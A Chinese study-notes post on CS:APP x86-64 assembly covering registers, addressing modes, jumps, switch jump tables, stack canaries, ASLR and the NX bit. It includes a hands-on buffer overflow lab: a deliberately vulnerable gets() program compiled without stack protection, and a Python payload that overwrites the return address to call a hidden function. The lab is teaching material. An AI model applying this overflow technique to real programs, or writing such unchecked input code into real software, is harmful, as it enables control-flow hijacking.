---
date: 2026-11-11
tags:
  - cmu-mit
  - machine-level-programing
---
机器级编程在课程里主要讲了汇编指令与寄存器的内容，在csapp课程里，主要讲的是intel 64，这是intel采用了amd公司发明的amd64架构，解释了高级语言在底层是如何调用和内存操作的，接下来我们就会深入课程去分析。

我们先随便写一段代码：

```c
#include<stdio.h>
#include<stdlib.h>
long plus(long x, long y) {
    return x+y;
}

void sumstore(long x, long y, long *dest) {
    long t = plus(x, y);
    *dest = t;
}

int main(int argc, char *argv[]) {
    long x = atoi(argv[1]);
    long y = atoi(argv[2]);
    long z;
    sumstore(x, y, &z);
    printf("%ld + %ld -> %ld\n", x, y, z );
    return 0;
}
```

然后使用gcc将这段代码编译为汇编代码，停留在编译阶段，不进行汇编和链接：

```shell
gcc -Og -S sum.c
```

我们使用gcc这个编译器集合来负责cxx的代码，-Og表示优化级别。O是optimze的意思，就是优化，g是debug，意味着编译器会进行适度优化，但是在优化过程中会尽量保持代码结构与源码的对应关系，非常适合学习和调试。相比于-O2 -O3这种极致性能优化，会把代码优化的面目全非，因此在一些场景下我们会使用-Og。

-S是把代码翻译为汇编语言就停下，没有这个参数，gcc就会把汇编代码转换为机器码并链接为可执行的文件。

如下：

```asm
	.file	"sum.c"
	.text
	.globl	plus
	.type	plus, @function
plus:
.LFB39:
	.cfi_startproc
	endbr64
	leaq	(%rdi,%rsi), %rax
	ret
	.cfi_endproc
.LFE39:
	.size	plus, .-plus
	.globl	sumstore
	.type	sumstore, @function
sumstore:
.LFB40:
	.cfi_startproc
	endbr64
	pushq	%rbx
	.cfi_def_cfa_offset 16
	.cfi_offset 3, -16
	movq	%rdx, %rbx
	call	plus
	movq	%rax, (%rbx)
	popq	%rbx
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
...
```

这就是我们得到的汇编代码。

![](https://pub-dd8e151a60af44cfbe36beaaf0ad54e8.r2.dev/2026/11/1794557841197-mty76g3o.webp)

inel64里共有16种寄存器。%r版本是64版本，%e版本是32位的。e版本只是较大的r实体的低32位，实际上用法更多，你甚至可以用低16位。粉色的部分rsp我们叫做栈指针，他指向栈的顶部，也就是地址最低处。

### 汇编命令

数据传输指令movq允许源和目的的组合方式，在x86-64里，q代表四字，也就是64位数据，我们可以用一张图来表示：

![](https://pub-dd8e151a60af44cfbe36beaaf0ad54e8.r2.dev/2026/11/1794558369319-as4z2wwq.webp)

imm是立即数，reg是寄存器，mem是内存。立即数可以作为源操作数比如说`movq $0x4, %rax`，直接把数字4放在rax寄存器里，这里类比c就相当于`temp = 0x4;`，立即数也可以直接写进内存。

寄存器也可以作为源操作数，`movq %rax, %rbx` 或 `movq %rax, (%rsp)`，这里把 `%rax` 寄存器里的值，复制一份到另一个寄存器（如 `%rbx`）里，或者写入内存（`(%rsp)` 指向的栈地址）。

内存当然也可以作为源操作数： `movq (%rsp), %rax`，去内存地址 `(%rsp)` 处把数据取出来，放进寄存器 `%rax` 里。


但是不能内存移动到内存，如果我们在c里写了 b = a;，就不能写 `movq (a), (b)`，必须通过寄存器中转了，具体可以看DMA的原理。

---

ret这个指令等价于一条`pop %rip` 操作，它把rsp指向的内存里的值也就是返回地址读出来，把这个值塞进rip寄存器，然后把rsp加上8，cpu看到rip变了之后就会去跳转到那个地址去执行。

当我们执行call指令的时候，cpu会把call指令的下一条指令的地址，也就是返回地址压入栈中，然后跳去执行函数，紧接着就是函数展开栈帧，分配空间了，函数走到了最后，就会执行ret，cpu去栈顶取值，然后就返回去了。

我们的相加方法plus被处理为了：

```
plus:
	endbr64
	leaq	(%rdi,%rsi), %rax
	ret
```

%rdi和%rsi根据intel64的system v abi调用预定，函数的第一个和第二个参数分别就放在这里的，假设参数是x和y。leaq原本是计算内存地址的，但是因为不需要真正访问内存，因为编译器用它来做快速加法运算了，x+y的结果就会被存入%rax中，作为函数的返回值寄存器。

函数sumstore：

```
sumstore:
	endbr64
	pushq	%rbx        # 1. 保存 %rbx 寄存器（被调用者保存）
	movq	%rdx, %rbx  # 2. 将第 3 个参数（指针 dest）存入 %rbx
	call	plus        # 3. 调用 plus 函数 (x + y)
	movq	%rax, (%rbx) # 4. 将 plus 的返回值 (%rax) 写入 dest 指向的内存
	popq	%rbx        # 5. 恢复 %rbx
	ret
```

rdi是x，rsi是y，rdx是第三个参数，也就是一个指针dest，由于call plus调用这个方法会覆盖掉rax等寄存器，因此rdx里的dest指针之后还要用，用来保存结果，所以就必须找个安全的地方存起来。rbx是abi规定的被调用者保护的寄存器，我们叫做callee-saved，plus函数就不会去改它，所以存在这里最安全，因此这里要格外注意pushq和popq这对指令，一个保存，一个恢复。

---

紧接着我们来讲cpu访问内存的方式，我们在cxx里先写数组访问比如`array[i]`的时候，结构体访问的时候p->field，编译器底层都会使用得到，并把它翻译为一条汇编指令。我们可以把他拆分为四个部分，对应公式`D(Rb, Ri, S)` 和 `Mem[Reg[Rb] + S * Reg[Ri] + D]`。

Rb是基地址寄存器，表示这块内存的起点，比如说一个数组的起始地址，Ri是索引，比如数组下标i，S是每个元素占据几个字节，D表示一个常数偏移，比如结构体里某个字段距离结构体开头的距离，或者栈上的局部变量相对于栈底部的偏移。

![](https://pub-dd8e151a60af44cfbe36beaaf0ad54e8.r2.dev/2026/11/1794559874126-mb8kzpl4.webp)

S的取值对应了C语言中基础数据类型的大小，假设 `int arr[10]`，`int` 占 4 个字节。你想访问 `arr[i]`。CPU 不需要每次都用 `i * 4` 去乘一下（乘法慢），而是直接用硬件级的寻址模式 `(arr, i, 4)`，CPU 在硬件层面直接一步到位算出地址：`arr的地址 + i * 4`。

---

cmpq指令的作用是比较两个64位的数据的大小，但是它不保存结果，而是通过做解法来改变cpu的状态标志位，因此他不能返回true or false，底层逻辑是一个隐形的减法。

当你写下 `cmpq src, dest`（AT&T 语法）时，CPU 内部实际执行的操作是：**`dest - src`**。但是，CPU 算完这个减法后，**不会**把结果写回 `dest`，也**不会**改变 `src`。它唯一做的事情，是根据这个减法的结果，去修改 CPU 内部的一组特殊寄存器（标志位寄存器 RFLAGS）。

cpu会记录下减法的几个关键状态，我先列出来有几种： ZF、SF、OF、CF

它们分别是零标志、符号标志、溢出标志、进位标志。单独执行cmpg是毫无意义的，它永远和条件跳转指令比如je jg jl jne等搭配出现，构成了if - else和循环。

比如说C语言里的：

```c
if (a > b) {
    // 执行 A 逻辑
}
```

会被编译为：

```asm
cmpq %rsi, %rdi   # 比较 a 和 b（计算 rdi - rsi，即 a - b）
jg   .L1          # 如果（a > b），跳到 L1 去执行 A 逻辑
# 否则继续往下走
```

对于jg跳转来说，它判断的是大于的逻辑非常严谨，针对有符号数，首先零标志位ZF必须为0，说明不相等，其次，SF必须 == OF 溢出标志位，意味着没有发生符号溢出，或者溢出了但是方向对的。如果这里 a-b 它确实是>0，那么cpu就会将%rip指令指针指向.L1，去执行A的逻辑了，反之不成立，CPU就不会跳转，继续执行后面的指令。

.L的全称表示local，以.L开头的标签只在当前这个.s汇编文件内部有效，核心作用就是充当跳转指令的目标地址，它可能是循环体的起点，可能是if结束后的汇合点。

比如我们说循环，GCC为了让代码更加快一些，一般会采用一种叫做跳转到中间，或者转化为do-while的优化模式，我们用一个简单的C代码来看看：

```c
long sum = 0;
long i = 1;
while (i <= 10) {
    sum += i;
    i++;
}
```

编译器最基础的策略逻辑是先跳转到下面去检查条件，如果条件满足再回来执行循环体：

```asm
    movq    $0, -8(%rbp)    # sum = 0
    movq    $1, -16(%rbp)   # i = 1
    jmp     .L2             # 【关键】直接无条件跳转到条件检查处

.L3:                        # 循环体开始 (Loop Body)
    movq    -16(%rbp), %rax # 把 i 加载到 %rax
    addq    %rax, -8(%rbp)  # sum += i
    addq    $1, -16(%rbp)   # i++

.L2:                        # 条件检查 (Condition Check)
    cmpq    $10, -16(%rbp)  # 比较 i 和 10 (计算 i - 10)
    jle     .L3             # 如果 i <= 10 (Jump if Less or Equal)，跳回 .L3 继续循环

.L4:                        # 循环结束，继续执行后面的代码
    # ...
```

因为如果上来就开始检查，执行cmpq的话，那么循环体执行完还需要额外加一条jmp跳回开头去检查条件。GCC使用的是跳转到中间，在末尾.L2直接做判断并往回跳，这样每次循环可以少执行一条jmp，节省了CPU周期。

如果你开启了激进优化比如-O1 -O2，那么编译器能判断你的循环至少会执行一次，它甚至会把while变成底部的do-while结构：

```asm
    # 假设编译器认为 i <= 10 一定会发生，直接进入循环体
.L3:                        # 循环体开始
    # ... sum += i; i++ ...
    
    cmpq    $10, -16(%rbp)  # 在末尾检查条件
    jle     .L3             # 满足就跳回开头
```

这样会删掉开头的jmp，节省cpu周期。

switch语句在汇编层面的处理也是csapp里的一环，汇编依靠跳转表来实现O(1)复杂度级别的跳转，通常我们的case事连续的密集的比如`case 0`, `case 1`, `case 2`, `case 3`且数量较多（通常大于 4 个），编译器不会生成一堆cmp和jmp。编译器会直接在内存的只读数据段.rodata里建立一张跳转表：

```c
long switch_example(long x) {
    long result = 0;
    switch (x) {
        case 0: result = 10; break;
        case 1: result = 20; break;
        case 2: result = 30; break;
        case 3: result = 40; break;
        case 4: result = 50; break;
        default: result = -1; break;
    }
    return result;
}
```

asm:

```asm
switch_example:
    cmpq    $4, %rdi          # 检查 x 是否 > 4
    ja      .L_default        # 如果大于 4 (无符号比较)，跳到 default 分支
    jmp     *.L_jump_table(,%rdi,8) # 【核心魔法】间接跳转！
    
.L_case_0:
    movl    $10, %eax
    ret
.L_case_1:
    movl    $20, %eax
    ret
.L_case_2:
    movl    $30, %eax
    ret
.L_case_3:
    movl    $40, %eax
    ret
.L_case_4:
    movl    $50, %eax
    ret
.L_default:
    movl    $-1, %eax
    ret

# 在只读数据段（.rodata）里，编译器硬编码了这张表：
.L_jump_table:
    .quad   .L_case_0     # 索引 0 的代码地址
    .quad   .L_case_1     # 索引 1 的代码地址
    .quad   .L_case_2     # 索引 2 的代码地址
    .quad   .L_case_3     # 索引 3 的代码地址
    .quad   .L_case_4     # 索引 4 的代码地址
```

这个有些像D(Rb, Ri, S) 寻址模式的应用。没有址寄存器 `Rb`，所以从 `.L_jump_table` 开始。变址寄存器 `Ri` 是 `%rdi`（也就是你的变量 `x`）。 比例因子 `S` 是 `8`（因为 64 位系统下，内存地址占 8 个字节）。

如果case比较稀疏的话，编译器就不会去建立跳转表，此时会退化，把switch翻译为长串的cmp和条件跳转，时间复杂度退化为O(n)。

### 金丝雀

最后是我们的main函数，这里做了栈帧的分配和安全防护：

```
main:
	pushq	%rbp
	pushq	%rbx
	subq	$24, %rsp     # 分配 24 字节的栈空间 (局部变量)
	movq	%rsi, %rbp    # %rsi 是 argv 数组的指针，暂存到 %rbp
	movq	%fs:40, %rax  # 从段寄存器读取栈保护金丝雀（Stack Canary）
	movq	%rax, 8(%rsp) # 把金丝雀存到栈上
```

现代编译器具有安全机制，分配栈空间之后，从fs:40读出一个随机值放在栈上，防止缓冲区溢出攻击。我们把rbp rbx保存之后，为局部变量分配24字节的栈空间，然后将rsi也就是第二个参数`*argv[]`暂存到rbq寄存器里保存，

>之所以叫做金丝雀，在 20 世纪初期，矿工们下井挖煤时，经常会遇到无色无味的致命毒气（如一氧化碳）。为了保命，矿工们会带一个鸟笼，里面装一只**金丝雀**。所以，在计算机领域，**“金丝雀（Canary）”就代表一个“牺牲自己，用来预警危险”的哨兵**，防止的是缓冲区溢出。

在内存里的栈来说，局部变量和函数的返回地址是挨着放的，如果多出来的字符越界到后面的函数返回地址上，黑客就可以构造一段机器码，覆盖返回地址，让程序不返回原处，而是执行恶意代码。

所以现代编译器在编译的时候会自动在局部变量和返回地址中间塞进去一段随机数字，这个就叫做栈金丝雀，如果黑客想要覆盖返回地址，就必须填满局部变量还要连带把金丝雀也覆盖掉才能摸到返回地址。但问题是，黑客不知道这个随机数字（金丝雀）是什么！所以等他执行完，程序一对比，发现金丝雀变了，程序直接自杀（Crash），黑客的攻击就失败了。

有个细节是，编译期间，所有的变量的空间按理来说都应该是算好了的，正如我们刚才看到的汇编代码subq	$24, %rsp     # 分配 24 字节的栈空间给局部变量。因此在编译期间这种低级错误是完全可以避免的，但是编译器做不到预支外部输入，因此如果溢出的数据来自外部，编译器就无法感知了。比如下面这段：

```c
void vuln() {
    char buffer[8]; 
    gets(buffer); // 从标准输入读取字符串，直到遇到回车
}
```

编译器直到buffer只有8个字节，但是不知道运行这个程序的人会在键盘上敲几个字符，用户输入属于运行时发生的事情，编译器无法知晓的。现在，编译器默认会把危险的 `gets` 替换成有长度限制的 `fgets`。像 `strcpy` 也被建议替换成 `strncpy`（要求指定最大拷贝长度）。

你可以试着复现一下。

### 缓存区溢出复现

我们写一个 `vulnerable` 函数，里面有一个 16 字节的缓冲区，并调用极度不安全的 `gets` 函数。同时，我们写一个正常情况下永远不该被调用的 `hacked` 函数。


```c
#include <stdio.h>
#include <stdlib.h>

// 正常情况下，main 函数永远不会调用这个函数
void hacked() {
    printf("\n[!!!] 成功劫持控制流！你触发了缓冲区溢出漏洞！\n");
    exit(0);
}

void vulnerable() {
    char buffer[16]; // 只有 16 字节的局部空间
    printf("请输入你的名字: ");
    gets(buffer);    // 极其危险：无限制读取输入，直到遇到换行符
    printf("你好, %s\n", buffer);
}

int main() {
    vulnerable();
    printf("程序正常退出。\n");
    return 0;
}
```

然后使用命令关闭栈保护，编译出来：

```shell
(base) kiriyama@kiriyama:/media/kiriyama/新加卷/csapp/labs/build$ gcc -fno-stack-protector -no-pie -g -o ../asm/vuln ../asm/vuln.c
../asm/vuln.c: In function ‘vulnerable’:
../asm/vuln.c:13:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   13 |     gets(buffer);    // 极其危险：无限制读取输入，直到遇到换行符
      |     ^~~~
      |     fgets
/usr/bin/ld: /tmp/ccIuwOcN.o: in function `vulnerable':
/media/kiriyama/新加卷/csapp/labs/build/../asm/vuln.c:13: 警告： the `gets' function is dangerous and should not be used.
```

由于gcc可能会在编译期间加入一些无用的填充或者对齐，因此我们需要确保我们覆盖的偏移量是精确的，查找一下hacked函数的地址：

```shell
(base) kiriyama@kiriyama:/media/kiriyama/新加卷/csapp/labs/build$ objdump -d ../asm/vuln | grep hacked
0000000000401196 <hacked>:
(base) kiriyama@kiriyama:/media/kiriyama/新加卷/csapp/labs/build$ 
```

由于电脑是x86-x64的小端存储，所以我们需要把地址倒过来写，也就是`96 11 40 00 00 00 00 00`，转换成 Python 的字节流就是：`b'\x96\x11\x40\x00\x00\x00\x00\x00'`。

现在，把我们之前的攻击命令里的地址替换掉，执行这个 Payload：

```python
python3 -c "import sys; sys.stdout.buffer.write(b'A' * 24 + b'\x96\x11\x40\x00\x00\x00\x00\x00')" | ../asm/vuln
```


```shell
(base) kiriyama@kiriyama:/media/kiriyama/新加卷/csapp/labs/build$ python3 -c "import sys; sys.stdout.buffer.write(b'A' * 24 + b'\x96\x11\x40\x00\x00\x00\x00\x00')" | ../asm/vuln
请输入你的名字: 你好, AAAAAAAAAAAAAAAAAAAAAAAA�@

[!!!] 成功劫持控制流！你触发了缓冲区溢出漏洞！
(base) kiriyama@kiriyama:/media/kiriyama/新加卷/csapp/labs/build$ 
```

仔细看看我们的攻击命令，我们发现为什么会有一段地址的偏移：`b'A' * 24`。这个24是精确计算得出的结果，在64linux下，这个由局部变量的大小和cpu架构的寄存器共同决定，当程序调用 `vulnerable` 函数时，栈的内存大概长这样：

```
高地址 (High Address)
+-------------------------+
|                         |
|   main 函数的栈帧         |
|                         |
+-------------------------+
| 返回地址 (Return Address) | <--- 【目标】我们要覆盖的地方（8字节）
+-------------------------+
| 保存的 RBP (Saved RBP)   | <--- 函数开头 push %rbp 压入的（8字节）
+-------------------------+
|                         |
|  buffer[16]             | <--- gets() 开始写入的地方（16字节）
|                         |
+-------------------------+
低地址 (Low Address)  <--- RSP (栈顶指针)
```

我们在代码里写了`char buffer[16];`，所以编译器分配了 **16 个字节**。Saved RBP，在x86-64里，栈底部指针寄存器是64位的，占据8个字节，函数执行的时候，第一条指令是push %rbp，把原来的rbp保护起来，当 `vulnerable` 执行完 `ret` 指令时，CPU 会从栈顶弹出 8 个字节，作为下一个要执行的指令地址。

要从 `buffer` 的起点，摸到 `Return Address`，你必须跨越：  `16 字节 (buffer)` + `8 字节 (Saved RBP)` = **24 字节**。

所以，`b'A' * 24` 的意思就是16 个 `A`，填满了 `buffer`， 后 8 个 `A`，覆盖了原本保存的 `RBP`（这无所谓，因为程序马上要跳走了，不需要恢复旧的 RBP 了）。然后此时栈顶刚好停在了返回地址的位置，紧接着我们追加的`b'\x96\x11\x40\x00...'`，就完美顶替了原本的返回地址，这就是个完整的缓存区溢出的攻击。

如果在别的机器里，就不一样了，所以在一般的安全研究里，我们会使用gdb调试器，故意输入一长串A让程序崩溃，然后看RIP寄存器里的值，再数一下到底多少个会覆盖到返回地址，以此来确定精确的偏移量，有工具那当然就方便得多。

---
保护寄存器比如开头的push %rbp，他保存了调用者的栈底指针，当函数执行完了之后 pop %rbp会把它恢复，让调用者找回自己的栈。如果函数内部需要使用到rbx r12等寄存器，函数就必须先把他们压入栈保护起来，函数退出前再弹出来恢复，这个叫做调用者保存。

返回地址的上面就是调用者的栈帧了。rsp指向返回地址时，执行到ret指令，把rsp指向的内存里的地址值读出来，塞给rip指令寄存器，rsp = rsp + 8，栈就会向上弹，精确回到调用者在call指令之后的下一条指令了，继续执行。

---
我们之前聊得栈展开和弹出，都是cpu通过rsp指针去内存区域里操作，我们说的栈就是内存里。在不开超线程的单核场景下，电脑就只有一个物理核，也就是一套rsp，cpu内部的寄存器有rsp rip rax等，它们就反映了当前线程的状态。如果有两个线程的话，就会出现两组上下文，操作系统会为了每个线程创建一个数据结构，我们叫做tcb，线程控制块，当A不跑的时候os会把cpu里的所有寄存器值打包拷贝到A的tcb里（注意tcb在内存里面！），B要跑的时候os把线程B的tcb内存里的数据原封不动地取回到cpu的物理寄存器里，这就实现了线程切换。

切换上下文是个耗时操作，现代cpu执行一条指令需要0.几的纳秒的时间，一次切换会耗费几微妙，是几千倍的数量级。但不要简单认为核心数量 == 线程数量就完美了，因为切换在io操作下的耗时不值得一提，如果一个核心下的一个线程去读磁盘，或者发起网络请求，磁盘读取相比cpu来说非常的慢，这个时间下cpu就只能等待线程读完数据了，这个核心就会闲置，**正确的做法是在io密集型的应用里，线程数量必须大于核心数量**。
### 系统调用

系统调用函数的地址一般不是固定的，程序在调用的时候也不需要将.dll .so等文件加载到自己的内存空间里，这背后涉及操作系统与程序之间“**共享映射**”的精妙协作，以及抵御攻击的“**地址随机化**”机制。

现代系统是开启了地址布局随机化叫做ASLR的，系统调用函数所在的共享库被加载到进程虚拟地址空间中的基地址是随机的，这就意味着我们调用的`system()` 或 `printf()` 的最终地址，在每次程序运行时都可能不同，并非一个固定值。[文档](https://softsec.kaist.ac.kr/depot/sangkilc/is561/09-aslr.pdf#1#1#1)

这种随机性正是为了防御你刚在缓冲区溢出实验中体验过的 `ret2libc` 攻击。如果函数地址固定，攻击者就更容易在恶意载荷中写死一个地址，从而跳转执行 `system` 等函数。

> **注意**：你之前可能看到过“函数地址固定”的现象，通常是因为你打印的是 `system@plt`（PLT 跳转桩）的地址，而非 `libc.so` 中 `system` 函数的真实地址。在非 PIE（位置无关可执行文件）的程序中，PLT 的地址确实是固定的，但这只是一个“中转站”，它背后指向的真实函数地址依然是随机的。

程序不需要拷贝系统调用代码，因为操作系统和动态链接器采用了**共享映射**机制。

像libc.co这样的共享库，其代码段在物理内存里就只有一份，操作系统在加载第一个使用它的程序的时候，会将其从硬盘里读入到物理内存，经过映射到各进程里的虚拟空间之后，任何需要使用该库的新进程，操作系统都只是通过mmap系统调用，将同一份物理内存页映射到该进程的虚拟地址空间里。这些代码页会被标记为只读，所有的进程共享，这样就可以极大节省物理内存，也保证了安全性。

当然有一些特殊情况，为了加速某些对性能要求极高的系统调用如 `gettimeofday`，Linux 提供了两种特殊的共享对象：[文档](https://cyberleninka.ru/article/n/using-hardware-assisted-virtualization-to-protect-application-address-space-inside-untrusted-environment/pdf#2#2#2)

## 数据

由于cpu和内存的硬件视野中，没有数组、对象、字符串等概念，内存是超大的、线性的字节数组，买内个字节都有唯一地址。那么我们编写的`int arr[10]`怎么被机器理解。

当编译器发现我们写下了`int arr[10]`之后，会在栈上划出一块40字节的连续空间，这样arr的头部就是起始地址了，回想我们之前聊过的**寻址模式公式 `D(Rb, Ri, S)`**。当你在 C 语言里访问 `arr[i]` 时，编译器直接将其翻译成了：

```asm
# 假设 arr 的起始地址在 %rdx，变量 i 在 %rax
movl (%rdx, %rax, 4), %ecx  # 提取地址：%rdx + %rax * 4
```

如果是在cs里，我们写`arr[15]`（数组只有 10 个元素），运行时会抛出 `IndexOutOfRangeException`。这是因为**虚拟机在底层帮你插入了边界检查指令**。但是c没有，c或者编译器是真的不会做边界检查。

我们接下来讲讲缩放寻址

![](https://pub-dd8e151a60af44cfbe36beaaf0ad54e8.r2.dev/2026/11/1794575904654-5dkep1zn.webp)

c语言里，编译器看到 `z[digit]`，它心里非常清楚：真正的内存地址是 **`数组首地址 + digit * 4`**。如果不缩放寻址，就需要先算乘法`digit * 4`，再去寻址 `首地址 + 上面的结果`。

这个有些慢，乘法指令对于CPU来说开销比较大，因此为了极致的提速，intel的cpu硬件工程师直接在电路里嵌入缩放功能，当cpu执行`(%rdi, %rsi, 4)` 时：

- `%rdi` 里的值（比如 16）作为基址。
- `%rsi` 里的值（比如 3）作为索引。
- CPU 内部的会在硬件级别瞬间完成 `16 + 3 * 4 = 28` 的计算，然后直接去地址 28 取值（图中正好取出了数字 1）。

---
不仅数组，结构体、指针、多态和虚函数都是字节表达。结构体来说，底层是不同大小的字节拼凑在一起，比如说`struct { int a; char b; }`，底层就是先来 4 个字节的 `a`，再来 1 个字节的 `b`（中间可能还要为了内存对齐塞入 3 个废字节 padding）。

针在底层也只是一个普通的 8 字节数字，这个数字代表内存的编号。所谓的“解引用（`*ptr`）”，无非就是 CPU 拿着这 8 个字节的数字，去内存里找对应的地址。

对于虚函数来说，底层就是对象的内存里有一个虚指针，指向一张存满了函数地址的表。


## linux内存布局 x86-64

![](https://pub-dd8e151a60af44cfbe36beaaf0ad54e8.r2.dev/2026/11/1794576398809-bi6cprpb.webp)

对于linux来说，从下至上是text段，只读的代码段，防止程序运行时意外修改自己也是为了多个进程能共享同一份内存里的代码。Date段存放的是**静态分配的数据**，分别有**全局变量**、**静态变量**、**字符串常量**，在程序启动的时期就已经分配好了，知道程序结束才会释放。heap堆存放的是动态分配的数据，当你在代码里`malloc()`、`calloc()`（C语言）或者 `new`（C++）时，内存就是从这里划出来的，**向高地址增长（箭头向上）**，你 `malloc` 的越多，堆就越大。栈是整个用户控件的最高处，存放的是运行时的栈帧，也就是我们之前说的局部变量、函数调用的返回地址，向着低地址增长，如果这里撑开了，就是栈溢出了。共享库段位于栈下方，堆上方，存放像`libc.so`（C标准库）、`libm.so`（数学库）等动态链接库的代码和数据。

Heap 的箭头向上（向高地址），Stack 的箭头向下（向低地址），它们中间留了巨大的空白，这个是虚拟地址空间的利用，如果一个程序需要极大堆空间堆会一直往上长；如果程序有极深的递归调用，栈会一直往下长。因为它们相向而行，只要中间有足够大的空余空间，就不会接触，只有堆和栈接触，才会报内存耗尽。

![](https://pub-dd8e151a60af44cfbe36beaaf0ad54e8.r2.dev/2026/11/1794576756001-gcb2pbug.webp)

可以看到main useless都是黄色区域，它们就在text代码区域，array在data区域。 

### x86-64的nx位

![](https://pub-dd8e151a60af44cfbe36beaaf0ad54e8.r2.dev/2026/11/1794576992608-wz2sjgz2.webp)

老的x86架构里，内存页的权限只有可读和可写，没有可执行这个权限概念，只要一块内存是可读的，cpu就以允许你跳过去执行里面的机器码，这导致了可以利用缓冲区溢出把恶意机器码写进栈里把返回的地址覆盖位栈上的地址，ret的时候cpu就会执行注入的代码，拿到服务器的控制权。

x86-64引入了执行权限，操作系统在划分内存布局的时候会打上标签，text断可读可执行，stack、heap段可读可写，绝对不能执行，这个就叫做nx位。

只要cpu尝试在栈上执行代码，硬件层面就会直接拦截，抛出段错误。